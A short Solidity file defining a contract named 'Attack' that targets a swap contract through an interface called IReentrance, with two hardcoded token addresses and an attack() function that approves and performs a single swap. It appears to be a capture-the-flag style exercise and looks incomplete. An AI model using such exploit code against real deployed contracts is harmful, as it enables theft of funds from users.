// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function isSold() external view returns (bool);
    function swap(address from, address to, uint256 amount) external;
}

contract Attack {
    IReentrance target;
    address public t1 = 0x7454DC8E278527c7072D11f99811350BEfD482B0;
    address public t2 = 0x445B80dcC2973dA1fCdb52C71937070e8336ce32;


    constructor(address _target) {
        target = IReentrance(_target);
    }

    function attack() public {
        target.approve(msg.sender,1000);
        target.swap(t1,t2,10);
    }
}